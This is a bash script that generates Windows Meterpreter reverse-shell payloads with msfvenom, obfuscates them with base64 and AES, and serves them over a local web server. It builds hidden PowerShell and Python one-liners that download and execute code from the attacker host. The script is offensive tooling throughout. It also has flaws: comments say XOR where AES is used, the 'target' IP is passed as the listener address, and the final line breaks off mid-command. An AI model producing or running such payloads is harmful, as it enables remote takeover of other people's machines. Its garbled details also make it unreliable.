#!/bin/bash

# Set the target IP and port
target_ip="192.168.1.1"
target_port="80"

# Set the output directory
output_dir="./payloads"

# Set the payload name and extension
payload_name="payload"
payload_ext="exe"

# Create the output directory if it doesn't exist
if [ ! -d "$output_dir" ]; then
  mkdir -p "$output_dir"
fi

# Generate a PowerShell payload using MSFVenom
echo "Generating PowerShell payload..."
ps_payload=$(msfvenom -p windows/meterpreter/reverse_tcp LHOST=$target_ip LPORT=$target_port -f psh -o "$output_dir/payload.ps1")

# Encode the PowerShell payload using Base64 and write it to a file
echo "Encoding PowerShell payload..."
echo "$ps_payload" | base64 -w0 > "$output_dir/payload.ps1.b64"

# Generate a Python payload using MSFVenom
echo "Generating Python payload..."
py_payload=$(msfvenom -p windows/meterpreter/reverse_tcp LHOST=$target_ip LPORT=$target_port -f raw -o "$output_dir/payload.py")

# Encode the Python payload using XOR and write it to a file
echo "Encoding Python payload..."
key=$(openssl rand -hex 16)
echo "Key: $key"
echo "$py_payload" | openssl enc -e -aes-256-cbc -K "$key" -iv 0 -nosalt | xxd -p | tr -d '\n' > "$output_dir/payload.py.enc"
echo "$key" > "$output_dir/key.txt"

# Generate a PowerShell command to download and execute the payload
ps_cmd="powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand $(cat "$output_dir/payload.ps1.b64" | tr -d '\n')"

# Generate a Python command to download and execute the payload
py_cmd="python -c \"exec('import requests;exec(requests.get(\\\"http://$target_ip/$payload_name.$payload_ext\\\").content)')\""

# Encode the commands using XOR and write them to a file
echo "Encoding commands..."
echo "$ps_cmd" | openssl enc -e -aes-256-cbc -K "$key" -iv 0 -nosalt | xxd -p | tr -d '\n' > "$output_dir/cmd_ps.enc"
echo "$py_cmd" | openssl enc -e -aes-256-cbc -K "$key" -iv 0 -nosalt | xxd -p | tr -d '\n' > "$output_dir/cmd_py.enc"

# Create a web server to serve the payload and commands
echo "Starting web server..."
cd "$output_dir"
python -m SimpleHTTPServer 80 >/dev/null 2>&1 &

echo "Payloads generated and encoded successfully."
echo "To download and execute the PowerShell payload, run the following command on the target system:"
echo "powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand $(cat "$output_dir/cmd_ps.enc" | xxd -p -r | openssl enc -d -aes-256-cbc -K $(cat "$output_dir/key.txt") -iv 0 -nosalt | base64 -w0)"
echo "To download and execute the Python payload, run the following command on the target system:"
echo "python -c \"exec('import requests;exec(requests.get(
